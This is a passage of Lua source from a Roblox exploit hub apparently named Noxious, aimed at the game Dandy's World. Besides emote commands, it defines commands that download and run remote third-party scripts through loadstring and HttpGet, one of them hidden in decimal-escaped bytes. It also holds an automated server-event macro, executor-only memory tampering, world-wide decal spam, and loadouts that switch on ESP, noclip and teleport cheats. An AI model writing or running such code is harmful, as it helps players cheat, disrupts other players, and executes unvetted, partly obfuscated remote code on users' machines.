	local Char = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local Human = Char and Char:WaitForChild("Humanoid", 15)
	local Animate = Char and Char:WaitForChild("Animate", 15)

	if Animate then
		Animate.Disabled = true
		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
			v:Stop()
		end
		Animate.Disabled = false
	end

	if not istposeloopenabled then return end
	istposeloopenabled = false

	if tposeloopconnection then
		tposeloopconnection:Disconnect()
		tposeloopconnection = nil
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local currentAnimationTrack 	
local inputConnection

local BarrelRollAnim = Instance.new"Animation"	
BarrelRollAnim.AnimationId = "rbxassetid://18226927388"

local WaveAnim = Instance.new"Animation"	
WaveAnim.AnimationId = "rbxassetid://17059625743"

local TwirlAnim = Instance.new"Animation"	
TwirlAnim.AnimationId = "rbxassetid://17630950280"

local Twirl2Anim = Instance.new"Animation"	
Twirl2Anim.AnimationId = "rbxassetid://18998583113"

local CheerAnim = Instance.new"Animation"	
CheerAnim.AnimationId = "rbxassetid://18199893624"

local ShimmyAnim = Instance.new"Animation"	
ShimmyAnim.AnimationId = "rbxassetid://18155419600"

local JumpAnim = Instance.new"Animation"	
JumpAnim.AnimationId = "rbxassetid://17295478127"

local FacepalmAnim = Instance.new"Animation"	
FacepalmAnim.AnimationId = "rbxassetid://73742913578970"

local PounceAnim = Instance.new"Animation"	
PounceAnim.AnimationId = "rbxassetid://17617839395"

local DiveAnim = Instance.new"Animation"	
DiveAnim.AnimationId = "rbxassetid://17175061517"

function playEmote(animation)
	if currentAnimationTrack then
		currentAnimationTrack:Stop()
	end
	currentAnimationTrack = humanoid:LoadAnimation(animation)
	currentAnimationTrack:Play()
	currentAnimationTrack:AdjustWeight(999)
end

function dwbarrelroll() playEmote(BarrelRollAnim) end
function dwwave() playEmote(WaveAnim) end
function dwtwirl() playEmote(TwirlAnim) end
function dwtwirl2() playEmote(Twirl2Anim) end
function dwcheer() playEmote(CheerAnim) end
function dwshimmy() playEmote(ShimmyAnim) end
function dwjump() playEmote(JumpAnim) end
function dwfacepalm() playEmote(FacepalmAnim) end
function dwdive() playEmote(DiveAnim) end
function dwpounce() playEmote(PounceAnim) end

function disableAnimation()
	if inputConnection then
		inputConnection:Disconnect()
		inputConnection = nil
	end
end

function enableAnimation(animationFunction)
	disableAnimation()
	inputConnection = noxious["user input service"].InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed then return end
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			animationFunction()
		end
	end)
end

noxious["local player"].CharacterAdded:Connect(updateCharacterReferences)

noxious["local player"].CharacterAdded:Connect(function(character)
	character:WaitForChild"Humanoid"	
end)

addcommand("headbang", "hbang", function()
	local HeadbangAnim = Instance.new"Animation"		
	HeadbangAnim.AnimationId = "rbxassetid://17561277632"

	local humanoid = noxious["local player"].Character and noxious["local player"].Character:FindFirstChildOfClass"Humanoid"		
	if humanoid then
		if currentAnimationTrack then
			currentAnimationTrack:Stop()
		end

		currentAnimationTrack = humanoid:LoadAnimation(HeadbangAnim)
		currentAnimationTrack:Play()

		currentAnimationTrack:AdjustWeight(999)
	end
end)

addcommand("dance", "dance", function()

	local DanceAnim = Instance.new"Animation"		
	DanceAnim.AnimationId = "rbxassetid://17516071317"

	local humanoid = noxious["local player"].Character and noxious["local player"].Character:FindFirstChildOfClass"Humanoid"		
	if humanoid then
		if currentAnimationTrack then
			currentAnimationTrack:Stop()
		end

		currentAnimationTrack = humanoid:LoadAnimation(DanceAnim)
		currentAnimationTrack:Play()

		currentAnimationTrack:AdjustWeight(999)
	end
end)

addcommand("crawl", "crawl", function()

	local TherianAnim = Instance.new"Animation"		
	TherianAnim.AnimationId = "rbxassetid://91029796934547"

	local humanoid = noxious["local player"].Character and noxious["local player"].Character:FindFirstChildOfClass"Humanoid"		
	if humanoid then
		if currentAnimationTrack then
			currentAnimationTrack:Stop()
		end

		currentAnimationTrack = humanoid:LoadAnimation(TherianAnim)
		currentAnimationTrack:Play()

		currentAnimationTrack:AdjustWeight(999)
	end
end)

addcommand("therian", "therian", function()

	local TherianAnim = Instance.new"Animation"		
	TherianAnim.AnimationId = "rbxassetid://17649190982"

	local humanoid = noxious["local player"].Character and noxious["local player"].Character:FindFirstChildOfClass"Humanoid"		
	if humanoid then
		if currentAnimationTrack then
			currentAnimationTrack:Stop()
		end

		currentAnimationTrack = humanoid:LoadAnimation(TherianAnim)
		currentAnimationTrack:Play()

		currentAnimationTrack:AdjustWeight(999)
	end
end)

addcommand("cradle", "cradle", function()
	local SitAnim = Instance.new"Animation"		
	SitAnim.AnimationId = "rbxassetid://18989418012"

	local humanoid = noxious["local player"].Character and noxious["local player"].Character:FindFirstChildOfClass"Humanoid"		
	if humanoid then
		if currentAnimationTrack then
			currentAnimationTrack:Stop()
		end

		currentAnimationTrack = humanoid:LoadAnimation(SitAnim)
		currentAnimationTrack:Play()

		currentAnimationTrack:AdjustWeight(999)
	end
end)

addcommand("pounce", "pounce", function()

	local PounceAnim = Instance.new"Animation"		
	PounceAnim.AnimationId = "rbxassetid://17617839395"

	local humanoid = noxious["local player"].Character and noxious["local player"].Character:FindFirstChildOfClass"Humanoid"		
	if humanoid then
		if currentAnimationTrack then
			currentAnimationTrack:Stop()
		end

		currentAnimationTrack = humanoid:LoadAnimation(PounceAnim)
		currentAnimationTrack:Play()

		currentAnimationTrack:AdjustWeight(999)
	end
end)

addcommand("sit", "sit", function()
	local Sit2Anim = Instance.new"Animation"		
	Sit2Anim.AnimationId = "rbxassetid://16873659196"

	local humanoid = noxious["local player"].Character and noxious["local player"].Character:FindFirstChildOfClass"Humanoid"		
	if humanoid then
		if currentAnimationTrack then
			currentAnimationTrack:Stop()
		end

		currentAnimationTrack = humanoid:LoadAnimation(Sit2Anim)
		currentAnimationTrack:Play()

		currentAnimationTrack:AdjustWeight(999)
	end
end)

addcommand("unheadbang", "unhbang", function()
	local Char = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local Human = Char and Char:WaitForChild("Humanoid", 15)
	local Animate = Char and Char:WaitForChild("Animate", 15)

	if Animate then
		Animate.Disabled = true
		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
			v:Stop()
		end
		Animate.Disabled = false
	end
end)

addcommand("unsit", "unsit", function()
	local Char = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local Human = Char and Char:WaitForChild("Humanoid", 15)
	local Animate = Char and Char:WaitForChild("Animate", 15)

	if Animate then
		Animate.Disabled = true
		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
			v:Stop()
		end
		Animate.Disabled = false
	end
end)

addcommand("undance", "undance", function()
	local Char = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local Human = Char and Char:WaitForChild("Humanoid", 15)
	local Animate = Char and Char:WaitForChild("Animate", 15)

	if Animate then
		Animate.Disabled = true
		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
			v:Stop()
		end
		Animate.Disabled = false
	end
end)

addcommand("uncrawl", "uncrawl", function()
	local Char = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local Human = Char and Char:WaitForChild("Humanoid", 15)
	local Animate = Char and Char:WaitForChild("Animate", 15)

	if Animate then
		Animate.Disabled = true
		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
			v:Stop()
		end
		Animate.Disabled = false
	end
end)

addcommand("untherian", "untheiran", function()
	local Char = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local Human = Char and Char:WaitForChild("Humanoid", 15)
	local Animate = Char and Char:WaitForChild("Animate", 15)

	if Animate then
		Animate.Disabled = true
		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
			v:Stop()
		end
		Animate.Disabled = false
	end
end)

addcommand("uncradle", "uncradle", function()
	local Char = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local Human = Char and Char:WaitForChild("Humanoid", 15)
	local Animate = Char and Char:WaitForChild("Animate", 15)

	if Animate then
		Animate.Disabled = true
		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
			v:Stop()
		end
		Animate.Disabled = false
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("wave", "wave", function()
	playEmote(WaveAnim)
end)

addcommand("enableclickwave", "ecwave", function()
	enableAnimation(dwwave)
end)

addcommand("disableclickwave", "dcwave", function()
	disableAnimation(dwwave)
end)

addcommand("doabarrelroll", "dabr", function()
	playEmote(BarrelRollAnim)
end)

addcommand("enableclickdoabarrelroll", "ecdabr", function()
	enableAnimation(dwbarrelroll)
end)

addcommand("disableclickdoabarrelroll", "dcdabr", function()
	disableAnimation(dwbarrelroll)
end)

addcommand("pounce", "pounce", function()
	playEmote(PounceAnim)
end)

addcommand("enableclickpounce", "ecpounce", function()
	enableAnimation(dwpounce)
end)

addcommand("disableclickpounce", "dcpounce", function()
	disableAnimation(dwpounce)
end)

addcommand("twirl", "twirl", function()
	playEmote(TwirlAnim)
end)

addcommand("enableclicktwirl", "ectwirl", function()
	enableAnimation(dwtwirl)
end)

addcommand("disableclicktwirl", "dctwirl", function()
	disableAnimation(dwtwirl)
end)

addcommand("twirl2", "twirl2", function()
	playEmote(Twirl2Anim)
end)

addcommand("enableclicktwirl2", "ectwirl2", function()
	enableAnimation(dwtwirl2)
end)

addcommand("disableclicktwirl2", "dctwirl2", function()
	disableAnimation(dwtwirl2)
end)

addcommand("shimmy", "shimmy", function()
	playEmote(ShimmyAnim)
end)

addcommand("enableclickshimmy", "ecshimmy", function()
	enableAnimation(dwshimmy)
end)

addcommand("disableclickshimmy", "dcshimmy", function()
	disableAnimation(dwshimmy)
end)

addcommand("facepalm", "facepalm", function()
	playEmote(FacepalmAnim)
end)

addcommand("enableclickfacepalm", "ecfacepalm", function()
	enableAnimation(dwfacepalm)
end)

addcommand("disableclickfacepalm", "dcfacepalm", function()
	disableAnimation(dwfacepalm)
end)

addcommand("jump", "jump", function()
	playEmote(JumpAnim)
end)

addcommand("enableclickjump", "ecjump", function()
	enableAnimation(dwjump)
end)

addcommand("disableclickjump", "dcjump", function()
	disableAnimation(dwjump)
end)

addcommand("cheer", "cheer", function()
	playEmote(CheerAnim)
end)

addcommand("enableclickcheer", "eccheer", function()
	enableAnimation(dwcheer)
end)

addcommand("disableclickcheer", "dccheer", function()
	disableAnimation(dwcheer)
end)

addcommand("dive", "dive", function()
	playEmote(DiveAnim)
end)

addcommand("enableclickdive", "ecdive", function()
	enableAnimation(dwdive)
end)

addcommand("disableclickdive", "dcdive", function()
	disableAnimation(dwdive)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("bacondwscript", "bacon", function()
	pcall(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/Dandy's%20World"))("t.me/arceusxscripts")		
	end)
end)

addcommand("gobbydwscript", "gobby", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/FBRnb7S7"))()
end)

addcommand("spooksdwscript", "spooks", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/ApparentlySpooks/dandysworldspookshub/refs/heads/main/obfuscated%20spooks%20hub%20dandys%20world.lua'))()
end)

addcommand("moxdwscript", "spooks", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/ApparentlySpooks/moxhubV3/refs/heads/main/dandys%20world.txt'))()
end)

addcommand("hexdwscript", "hex", function()
	loadstring(game:HttpGet"https://pastefy.app/lY7xd0Ks/raw")();
end)

addcommand("yiwdwscript", "yiw", function()
	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\83\53\101\70\69\52\55\104\34\41\41\40\41")()
end)

addcommand("bobbydwscript", "bobby", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/BobJunior1/Sup/refs/heads/main/Bobhub"))()
end)

addcommand("otvajnidwscript", "otvajni", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Amo1224gus/iriska/refs/heads/main/egashub.lua"))();
end)

addcommand("rodestrikerdwscript", "rodestriker", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/RodeStriker/TheDandyHelper/refs/heads/main/MainScript", true))()
end)

addcommand("soupdwscript", "soup", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/jjTq76Sp"))()
end)

addcommand("ffjdwscript", "ffj", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
end)

addcommand("poltergeistdwscript", "poltergeist", function()
	loadstring(game:HttpGet('https://pastebin.com/raw/VQnHXGLC'))()
end)

addcommand("oldnoxious", "oldnxs", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Team-Noxious/Noxious-Hub/refs/heads/main/Dandy's%20World/%5BOld%5D%20Noxious%20Hub"))()
end)

addcommand("otvajniflyscript", "otvajnifly", function()
	loadstring(game:HttpGet"https://pastebin.com/raw/PDdkDsgy")()
end)

addcommand("mobilekeyboard", "mk", function()
	loadstring(game:HttpGet"https://gist.githubusercontent.com/RedZenXYZ/4d80bfd70ee27000660e4bfa7509c667/raw/da903c570249ab3c0c1a74f3467260972c3d87e6/KeyBoard%2520From%2520Ohio%2520Fr%2520Fr")()
end)

addcommand("infiniteyield", "iy", function()
	loadstring(game:HttpGet"https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")()
end)

addcommand("explorer", "dex", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
end)

-------------------------------------------------------------------------------------------------------------------------------

-- State
local macroEnabled = false
local macroDelay = 0.1

-- Function to check if a ProximityPrompt is inside the Items folder
function isInItemsFolder(prompt)
	local Workspace = game:GetService("Workspace")
	Workspace:WaitForChild("CurrentRoom")
	local modelInRoom = waitForModelInRoom()
	local itemsFolder = modelInRoom:WaitForChild("Items")
	local parent = prompt.Parent
	while parent do
		if parent.Parent == itemsFolder then
			return true
		end
		parent = parent.Parent
	end
	return false
end

-- Fire proximity prompts only inside items folder
local function fireItemProximityPrompts()
	local Workspace = game:GetService("Workspace")
	Workspace:WaitForChild("CurrentRoom")
	local modelInRoom = waitForModelInRoom()
	local itemsFolder = modelInRoom:WaitForChild("Items")
	for _, v in ipairs(itemsFolder:GetDescendants()) do
		if v:IsA("ProximityPrompt") and isInItemsFolder(v) then
			fireproximityprompt(v)
		end
	end
end

local function onItemAdded()
	fireItemProximityPrompts()
end

if game.PlaceId == noxious["dandy's world run"] then 
	task.spawn(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local inGamePlayers = workspace:WaitForChild("InGamePlayers")
		while true do
			if macroEnabled then
				local abilityArgs = {
					inGamePlayers:WaitForChild(noxious["local player"].Name),
					CFrame.new(-98.01789093017578, 145.9248809814453, 137.4755401611328, -0.9124799370765686, 1.3586307545665477e-07, 0.40912148356437683, 1.1556380741239991e-07, 1, -7.433835946812906e-08, -0.40912148356437683, -2.0552624491188e-08, -0.9124799370765686),
					false
				}
				ReplicatedStorage:WaitForChild("Events"):WaitForChild("AbilityEvent"):InvokeServer(unpack(abilityArgs))

				local itemArgs = {
					inGamePlayers:WaitForChild(noxious["local player"].Name),
					noxious["local player"].Character:WaitForChild("Inventory"):WaitForChild("Slot1")
				}
				ReplicatedStorage:WaitForChild("Events"):WaitForChild("ItemEvent"):InvokeServer(unpack(itemArgs))
			end

			task.wait(macroDelay)
		end
	end)
end

addcommand("enablebassiemacro", "ebm", function(delay)
	execcmd("nccam")
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	character:WaitForChild"Head"		
	local playerModel = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"

	local toonName = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"ToonName"

	local characterName
	if not toonName then
		local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"Config"			
		local charNameValue = config and config:FindFirstChild"CharacterName"			
		if charNameValue and charNameValue:IsA"StringValue"then
			characterName = charNameValue.Value
		end
	end

	if (not toonName or toonName.Value ~= "Bassie") and (not characterName or characterName ~= "Bassie") then
		notify("You need to be Bassie to enable this.", 5, "error")
		return
	end

	local Workspace = game:GetService("Workspace")
	Workspace:WaitForChild("CurrentRoom")
	local modelInRoom = waitForModelInRoom()
	local itemsFolder = modelInRoom:WaitForChild("Items")
	itemsFolder.ChildAdded:Connect(onItemAdded)
	delay = tonumber(delay)
	if delay then
		macroDelay = delay
	end
	macroEnabled = true
end)

addcommand("disablebassiemacro", "dbm", function()
	macroEnabled = false
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("noclipcamera", "nccam", function()
	local sc = (debug and debug.setconstant) or setconstant
	local gc = (debug and debug.getconstants) or getconstants
	if not sc or not getgc or not gc then
		return notify("Your executor does not support this command.", 5, "error")
	end
	local pop = noxious["local player"].PlayerScripts.PlayerModule.CameraModule.ZoomController.Popper
	for _, v in pairs(getgc()) do
		if type(v) == 'function' and getfenv(v).script == pop then
			for i, v1 in pairs(gc(v)) do
				if tonumber(v1) == .25 then
					sc(v, i, 0)
				elseif tonumber(v1) == 0 then
					sc(v, i, .25)
				end
			end
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("chat", "talk", function(target, ...)
	text = table.concat({...}, " ")
	local ChatService = game:GetService("Chat")
	local Players = noxious["players"]

	local function bubl(player)
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end

	local targets = {}

	if not target or target == "" or target == "me" then
		table.insert(targets, Players.LocalPlayer)
	elseif target == "random" then
		local all = Players:GetPlayers()
		if #all > 0 then
			table.insert(targets, all[math.random(1, #all)])
		end
	elseif target == "others" then
		for _, p in ipairs(Players:GetPlayers()) do
			if p ~= Players.LocalPlayer then
				table.insert(targets, p)
			end
		end
	elseif target == "all" then
		targets = Players:GetPlayers()
	else
		for _, p in ipairs(Players:GetPlayers()) do
			if string.find(string.lower(p.Name), string.lower(target)) then
				table.insert(targets, p)
			end
		end
	end

	for _, p in ipairs(targets) do
		bubl(p)
	end
end)

local function fiyah(player)
	if player and player.Character then
		local character = player.Character
		local humanoid = character:FindFirstChildOfClass("Humanoid")

		if humanoid then

			-- Cleanup any existing fire first


			for _, part in pairs(character:GetChildren()) do
				if part:IsA("BasePart") then
					for _, existingFire in ipairs(part:GetChildren()) do
						if existingFire:IsA("Fire") then
							existingFire:Destroy()
						end
					end
				end
			end

			-- Apply new fire effects
			for _, part in pairs(character:GetChildren()) do
				if part:IsA("BasePart") then
					local fire = Instance.new("Fire")
					fire.Size = 10
					fire.Heat = 1
					fire.Parent = part
				end
			end
		end
	end
end

local function unfiyah(player)
	if player and player.Character then
		local character = player.Character

		-- Remove all fire effects
		for _, part in pairs(character:GetChildren()) do
			if part:IsA("BasePart") then
				for _, existingFire in ipairs(part:GetChildren()) do
					if existingFire:IsA("Fire") then
						existingFire:Destroy()
					end
				end
			end
		end
	end
end

-- Fire command
addcommand("fire", "fire", function(target)
	local players = noxious["players"]:GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	if not target or target == "" or target == "me" then
		fiyah(localPlayer)
	elseif target == "random" then
		if #players > 0 then
			local randomPlayer = players[math.random(1, #players)]
			fiyah(randomPlayer)
		end
	elseif target == "others" then
		for _, player in ipairs(players) do
			if player ~= localPlayer then
				task.spawn(function() fiyah(player) end)
			end
		end
	elseif target == "all" then
		for _, player in ipairs(players) do
			task.spawn(function() fiyah(player) end)
		end
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				fiyah(player)
				break
			end
		end
	end
end)

-- Unfire command
addcommand("unfire", "unfire", function(target)
	local players = noxious["players"]:GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	if not target or target == "" or target == "me" then
		unfiyah(localPlayer)
	elseif target == "random" then
		if #players > 0 then
			local randomPlayer = players[math.random(1, #players)]
			unfiyah(randomPlayer)
		end
	elseif target == "others" then
		for _, player in ipairs(players) do
			if player ~= localPlayer then
				task.spawn(function() unfiyah(player) end)
			end
		end
	elseif target == "all" then
		for _, player in ipairs(players) do
			task.spawn(function() unfiyah(player) end)
		end
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				unfiyah(player)
				break
			end
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("usepublicloadout", "upl", function()
	notify("Public loadout applied.", 5)
	execcmd("efb")
	execcmd("eaesp")
	execcmd("eac2")
	execcmd("en")
end)

addcommand("usesololoadout", "usl", function()
	notify("Solo loadout applied.", 5)
	execcmd("efb")
	execcmd("eaesp")
	execcmd("eac2")
	execcmd("eia")
	execcmd("eatpte")
	execcmd("ega")
end)

addcommand("useesplaodout", "uespl", function()
	notify("ESP loadout applied.", 5)
	execcmd("eafb")
	execcmd("eaesp")
	execcmd("eat")
end)

addcommand("usehealerloadout", "uhrl", function()
	notify("Healer loadout applied.", 5)
	execcmd("epesp")
	execcmd("etesp")
	execcmd("sph")
	execcmd("etn")
	execcmd("elhn")
	execcmd("edpn")
	execcmd("maxzoom inf")
	execcmd("nccam")
	execcmd("eiesp")
end)

addcommand("usedistractorloadout", "udl", function()
	notify("Distractor loadout applied.", 5)
	execcmd("efeesp")
	execcmd("etesp")
	execcmd("epesp")
	execcmd("sph")
	execcmd("etn")
	execcmd("elhn")
	execcmd("edpn")
	execcmd("maxzoom inf")
	execcmd("nccam")
	execcmd("eiesp")
end)

addcommand("useblatantloadout", "ubl", function()
	notify("Blatant loadout applied.", 5)
	execcmd("eaesp")
	execcmd("ecg")
	execcmd("eatpte")
	execcmd("eac2")
	execcmd("elrs")
	execcmd("tpwalk 0.2")
	execcmd("noclip")
	execcmd("maxzoom inf")
	execcmd("nccam")
	execcmd("eia")
	execcmd("ega")
end)

addcommand("usesemiblatantloadout", "usbl", function()
	notify("Semi blatant loadout applied.", 5)
	execcmd("eaesp")
	execcmd("eatpte")
	execcmd("eac2")
	execcmd("elrs")
	execcmd("tpwalk 0.2")
	execcmd("noclip")
	execcmd("maxzoom inf")
	execcmd("nccam")
	execcmd("eia")
	execcmd("ega")
end)

-------------------------------------------------------------------------------------------------------------------------------

function dwshrimpdecal()
	local function replacealltextures(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://97212326743600" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://97212326743600"
				Two.Texture = "rbxassetid://97212326743600"
				Three.Texture = "rbxassetid://97212326743600"
				Four.Texture = "rbxassetid://97212326743600"
				Five.Texture = "rbxassetid://97212326743600"
				Six.Texture = "rbxassetid://97212326743600"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			replacealltextures(v)
		end
	end
	local function applytextures(root)
		for _, v in pairs(root:GetChildren()) do
			applytextures(v)
		end
	end
	replacealltextures(game.Workspace)
	applytextures(game.Workspace)

	local lighting = game:GetService"Lighting"

	local sky = lighting:FindFirstChildOfClass"Sky"or Instance.new"Sky"

	sky.SkyboxBk = "rbxassetid://97212326743600"
	sky.SkyboxDn = "rbxassetid://97212326743600"
	sky.SkyboxFt = "rbxassetid://97212326743600"
	sky.SkyboxLf = "rbxassetid://97212326743600"
	sky.SkyboxRt = "rbxassetid://97212326743600"
	sky.SkyboxUp = "rbxassetid://97212326743600"
end

addcommand("scriptshrimpodecalspam", "ssods", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local _=
		game.Players.LocalPlayer
	local ChatService = game:GetService("TextChatService")        
	local channel = ChatService.TextChannels:FindFirstChild("RBXGeneral")

	if channel then
		channel:SendAsync("/e shrimp")        
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function veryscarydecalspam()
	local function replacealltextures(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://15848332855" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://15848332855"
				Two.Texture = "rbxassetid://15848332855"
				Three.Texture = "rbxassetid://15848332855"
				Four.Texture = "rbxassetid://15848332855"
				Five.Texture = "rbxassetid://15848332855"
				Six.Texture = "rbxassetid://15848332855"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			replacealltextures(v)
		end
	end
	local function applytextures(root)
		for _, v in pairs(root:GetChildren()) do
			applytextures(v)
		end
	end
	replacealltextures(game.Workspace)
	applytextures(game.Workspace)

	local lighting = game:GetService"Lighting"

	local sky = lighting:FindFirstChildOfClass"Sky"or Instance.new"Sky"

	sky.SkyboxBk = "rbxassetid://15848332855"
	sky.SkyboxDn = "rbxassetid://15848332855"
	sky.SkyboxFt = "rbxassetid://15848332855"
	sky.SkyboxLf = "rbxassetid://15848332855"
	sky.SkyboxRt = "rbxassetid://15848332855"
	sky.SkyboxUp = "rbxassetid://15848332855"
end

addcommand("scriptveryscarydecalspam", "svsyds", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local _=game.Players.LocalPlayer
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e im very scared"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function scarydecalspam()
	local function replacealltextures(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://112289855511517" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://112289855511517"
				Two.Texture = "rbxassetid://112289855511517"
				Three.Texture = "rbxassetid://112289855511517"
				Four.Texture = "rbxassetid://112289855511517"
				Five.Texture = "rbxassetid://112289855511517"
				Six.Texture = "rbxassetid://112289855511517"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			replacealltextures(v)
		end
	end
	local function applytextures(root)
		for _, v in pairs(root:GetChildren()) do
			applytextures(v)
		end
	end
	replacealltextures(game.Workspace)
	applytextures(game.Workspace)

	local lighting = game:GetService"Lighting"

	local sky = lighting:FindFirstChildOfClass"Sky"or Instance.new"Sky"

	sky.SkyboxBk = "rbxassetid://112289855511517"
	sky.SkyboxDn = "rbxassetid://112289855511517"
	sky.SkyboxFt = "rbxassetid://112289855511517"
	sky.SkyboxLf = "rbxassetid://112289855511517"
	sky.SkyboxRt = "rbxassetid://112289855511517"
	sky.SkyboxUp = "rbxassetid://112289855511517"
end

addcommand("scriptscarydecalspam", "ssyds", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local _=game.Players.LocalPlayer
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e im scared"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function noxiousdecalspam()
	local function replacealltextures(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://129909577310669" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://129909577310669"
				Two.Texture = "rbxassetid://129909577310669"
				Three.Texture = "rbxassetid://129909577310669"
				Four.Texture = "rbxassetid://129909577310669"
				Five.Texture = "rbxassetid://129909577310669"
				Six.Texture = "rbxassetid://129909577310669"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			replacealltextures(v)
		end
	end
	local function applytextures(root)
		for _, v in pairs(root:GetChildren()) do
			applytextures(v)
		end
	end
	replacealltextures(game.Workspace)
	applytextures(game.Workspace)

	local lighting = game:GetService"Lighting"

	local sky = lighting:FindFirstChildOfClass"Sky"or Instance.new"Sky"

	sky.SkyboxBk = "rbxassetid://129909577310669"
	sky.SkyboxDn = "rbxassetid://129909577310669"
	sky.SkyboxFt = "rbxassetid://129909577310669"
	sky.SkyboxLf = "rbxassetid://129909577310669"
	sky.SkyboxRt = "rbxassetid://129909577310669"
	sky.SkyboxUp = "rbxassetid://129909577310669"
end

